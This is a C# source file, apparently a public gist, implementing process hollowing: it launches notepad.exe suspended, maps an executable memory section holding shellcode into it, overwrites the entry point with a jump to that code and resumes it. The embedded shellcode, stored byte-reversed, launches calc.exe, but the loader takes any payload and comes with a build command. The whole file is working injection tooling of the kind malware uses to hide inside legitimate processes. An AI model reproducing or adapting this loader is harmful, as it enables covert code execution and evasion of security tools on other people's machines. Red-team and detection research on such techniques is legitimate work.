
/***************
 * Simple Process Hollowing in C# 
 *
 * https://gist.github.com/affix/994d7b806a6eaa605533f46e5c27fa5e
 * #Build Your Binaries
 * 		c:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe Hollowing.cs /unsafe
 *  
 *  @author: Michael Gorelik <smgorelik@gmail.com>
 *  gist.github.com/smgorelik/9a80565d44178771abf1e4da4e2a0e75
 * #Most of the code taken from here: @github: github.com/ambray
 * 
 **************/

using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace Hollowing
{
    public sealed class Loader
    {	
		public static byte[] target_ = Encoding.ASCII.GetBytes("calc.exe");
		public static string HollowedProcessX85 = "C:\\Windows\\SysWOW64\\notepad.exe";

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct STARTUPINFO
        {
            uint cb;
            IntPtr lpReserved;
            IntPtr lpDesktop;
            IntPtr lpTitle;
            uint dwX;
            uint dwY;
            uint dwXSize;
            uint dwYSize;
            uint dwXCountChars;
            uint dwYCountChars;
            uint dwFillAttributes;
            uint dwFlags;
            ushort wShowWindow;
            ushort cbReserved;
            IntPtr lpReserved2;
            IntPtr hStdInput;
            IntPtr hStdOutput;
            IntPtr hStdErr;
        }

        public const uint PageReadWriteExecute = 0x40;
        public const uint PageReadWrite = 0x04;
        public const uint PageExecuteRead = 0x20;
        public const uint MemCommit = 0x00001000;
        public const uint SecCommit = 0x08000000;
        public const uint GenericAll = 0x10000000;
        public const uint CreateSuspended = 0x00000004;
        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void CloseHandle(IntPtr handle);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);

        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);


        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten);


        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_INFO
        {
            public uint dwOem;
            public uint dwPageSize;
            public IntPtr lpMinAppAddress;
            public IntPtr lpMaxAppAddress;
            public IntPtr dwActiveProcMask;
            public uint dwNumProcs;
            public uint dwProcType;
            public uint dwAllocGranularity;
            public ushort wProcLevel;
            public ushort wProcRevision;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct LARGE_INTEGER
        {
            public uint LowPart;
            public int HighPart;
        }

        IntPtr section_;
        IntPtr localmap_;
        IntPtr remotemap_;
        IntPtr localsize_;
        IntPtr remotesize_;
        IntPtr pModBase_;
        IntPtr pEntry_;
        uint rvaEntryOffset_;
        uint size_;
        byte[] inner_;

        public uint round_to_page(uint size)
        {
            SYSTEM_INFO info = new SYSTEM_INFO();

            GetSystemInfo(ref info);

            return (info.dwPageSize - size % info.dwPageSize) + size;
        }

        const int AttributeSize = 24;

        private bool nt_success(long v)
        {
            return (v >= 0);
        }

        public IntPtr GetCurrent()
        {
            return GetCurrentProcess();
        }



        /***
         *  Maps a view of the current section into the process specified in procHandle.
         */
        public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
        {
            IntPtr baseAddr = addr;
            IntPtr viewSize = (IntPtr)size_;


            long status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);

            if (!nt_success(status))
                throw new SystemException("[x] Something went wrong! " + status);

            return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
        }

        /***
         *  Attempts to create an RWX section of the given size 
         */
        public bool CreateSection(uint size)
        {
            LARGE_INTEGER liVal = new LARGE_INTEGER();
            size_ = round_to_page(size);
            liVal.LowPart = size_;

            long status = ZwCreateSection(ref section_, GenericAll, (IntPtr)0, ref liVal, PageReadWriteExecute, SecCommit, (IntPtr)0);

            return nt_success(status);
        }



        /***
         *  Maps a view of the section into the current process
         */
        public void SetLocalSection(uint size)
        {

            KeyValuePair<IntPtr, IntPtr> vals = MapSection(GetCurrent(), PageReadWriteExecute, IntPtr.Zero);
            if (vals.Key == (IntPtr)0)
                throw new SystemException("[x] Failed to map view of section!");

            localmap_ = vals.Key;
            localsize_ = vals.Value;

        }

        /***
         * Copies the shellcode buffer into the section 
         */
        public void CopyShellcode(byte[] buf)
        {
            long lsize = size_;
            if (buf.Length > lsize)
                throw new IndexOutOfRangeException("[x] Shellcode buffer is too long!");

            unsafe
            {
                byte* p = (byte*)localmap_;

                for (int i = 0; i < buf.Length; i++)
                {
                    p[i] = buf[i];
                }
            }
        }

        /***
         *  Create a new process using the binary located at "path", starting up suspended.
         */
        public PROCESS_INFORMATION StartProcess(string path)
        {
            STARTUPINFO startInfo = new STARTUPINFO();
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();

            uint flags = CreateSuspended;// | DetachedProcess | CreateNoWindow;

            if (!CreateProcess((IntPtr)0, path, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo))
                throw new SystemException("[x] Failed to create process!");


            return procInfo;
        }

        const ulong PatchSize = 0x10;

        /***
         *  Constructs the shellcode patch for the new process entry point. It will build either an x86 or x64 payload based
         *  on the current pointer size.
         *  Ultimately, we will jump to the shellcode payload
         */
        public KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
        {
            int i = 0;
            IntPtr ptr;

            ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);

            unsafe
            {
				byte*  p = (byte*)ptr;
                byte[] tmp = null;

                if (IntPtr.Size == 4)
                {
                    p[i] = 0xb8; // mov eax, <imm4>
                    i++;
                    Int32 val = (Int32)dest;
                    tmp = BitConverter.GetBytes(val);
                }
                else
                {
                    p[i] = 0x48; // rex
                    i++;
                    p[i] = 0xb8; // mov rax, <imm8>
                    i++;

                    Int64 val = (Int64)dest;
                    tmp = BitConverter.GetBytes(val);
                }

                for (int j = 0; j < IntPtr.Size; j++)
                    p[i + j] = tmp[j];

                i += IntPtr.Size;
                p[i] = 0xff;
                i++;
                p[i] = 0xe0; // jmp [r|e]ax
                i++;
            }

            return new KeyValuePair<int, IntPtr>(i, ptr);
        }


        /**
         * We will locate the entry point for the main module in the remote process for patching.
         */
        private IntPtr GetEntryFromBuffer(byte[] buf)
        {
            IntPtr res = IntPtr.Zero;
            unsafe
            {
                fixed (byte* p = buf)
                {
                    uint e_lfanew_offset = *((uint*)(p + 0x3c)); // e_lfanew offset in IMAGE_DOS_HEADERS

                    byte* nthdr = (p + e_lfanew_offset);

                    byte* opthdr = (nthdr + 0x18); // IMAGE_OPTIONAL_HEADER start

                    ushort t = *((ushort*)opthdr);

                    byte* entry_ptr = (opthdr + 0x10); // entry point rva

                    int tmp = *((int*)entry_ptr);

                    rvaEntryOffset_ = (uint)tmp;

                    // rva -> va
                    if (IntPtr.Size == 4)
                        res = (IntPtr)(pModBase_.ToInt32() + tmp);
                    else
                        res = (IntPtr)(pModBase_.ToInt64() + tmp);

                }
            }

            pEntry_ = res;
            return res;
        }

        /**
         *  Locate the module base addresss in the remote process,
         *  read in the first page, and locate the entry point.
         */
        public IntPtr FindEntry(IntPtr hProc)
        {
            PROCESS_BASIC_INFORMATION basicInfo = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;

            long success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
            if (!nt_success(success))
                throw new SystemException("[x] Failed to get process information!");

            IntPtr readLoc = IntPtr.Zero;
            byte[] addrBuf = new byte[IntPtr.Size];
            if (IntPtr.Size == 4)
            {
                readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
            }
            else
            {
                readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
            }

            IntPtr nRead = IntPtr.Zero;

            if (!ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead) || nRead == IntPtr.Zero)
                throw new SystemException("[x] Failed to read process memory!");

            if (IntPtr.Size == 4)
                readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
            else
                readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            pModBase_ = readLoc;
            if (!ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead) || nRead == IntPtr.Zero)
                throw new SystemException("[x] Failed to read module start!");

            return GetEntryFromBuffer(inner_);
        }

        /**
         *  Map our shellcode into the remote (suspended) process,
         *  locate and patch the entry point (so our code will run instead of
         *  the original application), and resume execution.
         */
        public void MapAndStart(PROCESS_INFORMATION pInfo)
        {

            KeyValuePair<IntPtr, IntPtr> tmp = MapSection(pInfo.hProcess, PageReadWriteExecute, IntPtr.Zero);
            if (tmp.Key == (IntPtr)0 || tmp.Value == (IntPtr)0)
                throw new SystemException("[x] Failed to map section into target process!");

            remotemap_ = tmp.Key;
            remotesize_ = tmp.Value;

            KeyValuePair<int, IntPtr> patch = BuildEntryPatch(tmp.Key);

            try
            {

                IntPtr pSize = (IntPtr)patch.Key;
                IntPtr tPtr = new IntPtr();

                if (!WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr) || tPtr == IntPtr.Zero)
                    throw new SystemException("[x] Failed to write patch to start location! " + GetLastError());
            }
            finally
            {
                if (patch.Value != IntPtr.Zero)
                    Marshal.FreeHGlobal(patch.Value);
            }

            byte[] tbuf = new byte[0x1000];
            IntPtr nRead = new IntPtr();
            if (!ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead))
                throw new SystemException("Failed!");

            uint res = ResumeThread(pInfo.hThread);
            if (res == unchecked((uint)-1))
                throw new SystemException("[x] Failed to restart thread!");

        }

        public IntPtr GetBuffer()
        {
            return localmap_;
        }
        ~Loader()
        {
            if (localmap_ != (IntPtr)0)
                ZwUnmapViewOfSection(section_, localmap_);

        }

        /**
         * Given a path to a binary and a buffer of shellcode,
         * 1.) start a new (supended) process
         * 2.) map a view of our shellcode buffer into it
         * 3.) patch the original process entry point
         * 4.) resume execution
         */
        public void Load(string targetProcess, byte[] shellcode)
        {

            PROCESS_INFORMATION pinf = StartProcess(targetProcess);
            FindEntry(pinf.hProcess);

            if (!CreateSection((uint)shellcode.Length))
                throw new SystemException("[x] Failed to create new section!");

            SetLocalSection((uint)shellcode.Length);

            CopyShellcode(shellcode);


            MapAndStart(pinf);

            CloseHandle(pinf.hThread);
            CloseHandle(pinf.hProcess);

        }

        public Loader()
        {
            section_ = new IntPtr();
            localmap_ = new IntPtr();
            remotemap_ = new IntPtr();
            localsize_ = new IntPtr();
            remotesize_ = new IntPtr();
            inner_ = new byte[0x1000]; // Reserve a page of scratch space
        }
        static void Main(string[] args)
        {

            /* Run Calc */
            byte[] shellcode = new byte[276] {0x00,0x65,0x65,0x78,0x65,0x2e,0x63,0x6c,0x61,0x63,0x61,0x6c,0xd5,0xff,0xda,0x89,0x41,0x59,0x00,0x6a,0x6f,0x72,0x72,0x13,0x47,0xbb,0x05,0x75,0xe0,0xfb,0x80,0x0a,0x7c,0x06,0x3c,0x28,0xc4,0x83,0x48,0xff,0xd5,0xff,0x9d,0xbd,0x95,0xa6,0xba,0x41,0x0a,0x2a,0x1d,0xe0,0xbb,0xff,0x87,0x6f,0x8b,0x31,0xba,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xba,0x48,0xff,0xff,0xff,0x57,0xe9,0x12,0x8b,0x48,0x5a,0x41,0x59,0x58,0xff,0xe0,0x52,0x41,0x20,0xec,0x83,0x48,0x41,0x5a,0x41,0x59,0x41,0x58,0x41,0x5a,0x41,0x59,0x41,0x58,0x59,0x5e,0x5a,0x41,0x59,0x58,0xff,0xe0,0x52,0xed,0xe2,0x01,0xc1,0x41,0x0d,0xc9,0xc1,0x41,0x75,0xe0,0x38,0x1c,0x41,0xd1,0x02,0x41,0xe2,0x01,0xc1,0x01,0x41,0x88,0x02,0x31,0x4d,0x4a,0x4a,0xb7,0x0f,0x48,0x50,0x50,0xd0,0x01,0x48,0x67,0x85,0x00,0x00,0x00,0x88,0x80,0x8b,0x01,0x48,0x1c,0x40,0x8b,0x44,0x8b,0x18,0x48,0x18,0x48,0x8b,0x18,0x41,0x18,0x48,0x01,0xd6,0x41,0x88,0x34,0x8b,0x41,0xff,0xff,0x57,0xff,0x48,0x56,0x51,0x52,0x50,0x41,0x50,0x41,0x51,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x41,0xc0,0x31,0x4d,0x4d,0x48,0x4c,0xff,0x4c,0x31,0xd2,0x48,0x56,0x51,0x52,0x51,0x50,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0xe8,0xf0,0xe4,0x83,0x48,0xfc,0x00};
            Array.Reverse(shellcode);
            int size = shellcode.Length;

         


            byte[] finalshellcode = new byte[shellcode.Length + target_.Length+1];
            Array.Copy(shellcode, finalshellcode, shellcode.Length);
            Array.Copy(target_, 0, finalshellcode, shellcode.Length, target_.Length);
            finalshellcode[shellcode.Length + target_.Length] = 0;
			
            Loader ldr = new Loader();
            try
            {
                ldr.Load(HollowedProcessX85, finalshellcode);
            }
            catch (Exception e)
            {
                Console.WriteLine("[x] Something went wrong!" + e.Message);
            }
        }

    }
}